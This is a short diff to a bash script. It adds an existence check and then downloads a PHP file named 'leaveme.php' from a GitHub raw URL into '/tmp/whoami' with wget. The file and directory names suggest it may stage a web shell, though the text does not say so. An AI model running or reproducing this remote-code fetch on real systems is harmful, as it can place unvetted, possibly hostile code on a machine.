@@ -1,2 +1,7 @@
-cd /tmp/whoami
-wget raw.githubusercontent.com/0xbeethoven/zero/main/leaveme.php
+#!/bin/bash
+dir="/tmp/whoami"
+filename="leaveme.php"
+if [ ! -e "$dir/$filename" ]; then
+    cd "$dir" || exit
+    wget "raw.githubusercontent.com/0xbeethoven/zero/main/$filename"
+fi
